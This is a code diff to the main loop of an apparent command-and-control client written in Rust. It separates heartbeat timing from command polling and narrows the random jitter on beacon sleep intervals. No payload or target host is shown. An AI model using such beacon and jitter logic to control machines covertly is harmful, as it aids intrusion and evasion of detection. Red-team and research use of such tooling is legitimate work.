@@ -41,20 +41,28 @@ impl C2Client {
         self.register().await?;
         println!("C2 Client started with ID: {}", self.client_info.id);
 
+        let mut last_heartbeat = std::time::Instant::now();
+        let heartbeat_duration = Duration::from_secs(self.config.heartbeat_interval);
+
         loop {
-            if let Err(e) = self.send_heartbeat().await {
-                eprintln!("Failed to send heartbeat: {e}");
+            // Send heartbeat only when needed
+            if last_heartbeat.elapsed() >= heartbeat_duration {
+                if let Err(e) = self.send_heartbeat().await {
+                    eprintln!("Failed to send heartbeat: {e}");
+                }
+                last_heartbeat = std::time::Instant::now();
             }
 
+            // Check commands more frequently
             if let Err(e) = self.check_and_execute_commands().await {
                 eprintln!("Failed to check commands: {e}");
             }
 
-            // Random interference factor
-            let base_interval = self.config.heartbeat_interval;
-            let jitter_range = (base_interval as f64 * 0.5) as u64;
+            // Sleep for command check interval (faster response)
+            let base_interval = self.config.command_check_interval;
+            let jitter_range = (base_interval as f64 * 0.2) as u64; // Reduced jitter for faster response
             let jitter: i64 = rand::random_range(-(jitter_range as i64)..=(jitter_range as i64));
-            let adjusted_interval = (base_interval as i64 + jitter).max(1) as u64; // 确保时间至少为 1 秒
+            let adjusted_interval = (base_interval as i64 + jitter).max(1) as u64;
 
             sleep(Duration::from_secs(adjusted_interval)).await;
         }
